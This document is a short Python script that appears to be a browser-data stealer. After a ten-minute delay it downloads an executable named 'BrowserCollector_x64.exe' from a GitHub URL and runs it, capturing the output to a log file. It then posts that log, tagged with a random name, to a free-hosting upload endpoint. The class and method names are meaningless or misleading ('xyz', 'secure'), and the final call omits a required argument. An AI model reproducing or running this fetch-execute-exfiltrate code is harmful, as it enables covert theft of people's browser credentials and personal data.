import requests
import ctypes, sys
import subprocess,  random, string, os, threading, time



class xyz():


        def __init__(self):

                def is_admin():
                        try:
                                return ctypes.windll.shell32.IsUserAnAdmin()
                        except:
                                return False

                url = 'https://github.com/somkietacode/simple-exec/raw/main/BrowserCollector_x64.exe'
                r = requests.get(url, allow_redirects=True)
                open('xxxxxxxx.exe', 'wb').write(r.content)
                self.is_admin = is_admin()

        def secure(self,x):

                def send():
                    t = threading.Thread(target=os.system, args=('xxxxxxxx.exe > log.txt',) )
                    t.start()
                    time.sleep(10)
                    name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(25))
                    r = requests.post('https://filehandler-nqtm.000webhostapp.com/post-file.php', data={ 'x' : "\n-------------------------\n"+name+"\n----------------------------\n"+open('log.txt', 'r').read() })
                    print(r.text)
                send()



if __name__ == "__main__" :
    time.sleep(600)
    nqnt = xyz()
    nqnt.secure()
